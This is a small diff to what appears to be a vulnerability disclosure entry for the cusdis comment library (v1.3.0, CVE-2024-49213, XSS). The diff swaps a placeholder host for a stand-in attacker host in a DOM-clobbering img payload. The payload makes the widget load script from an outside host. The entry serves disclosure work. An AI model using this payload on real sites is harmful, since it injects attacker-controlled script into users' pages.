@@ -5,7 +5,7 @@
 + Library: cusdis
 + Stars: 2.6K
 + Version: v1.3.0
-+ Payload: ```<img name="currentScript" data-host="https://xxx.xxx.xxx">```
++ Payload: ```<img name="currentScript" data-host="https://attack.hulk">```
 + Impact: XSS
 + CVE: CVE-2024-49213
 + Status: Reported
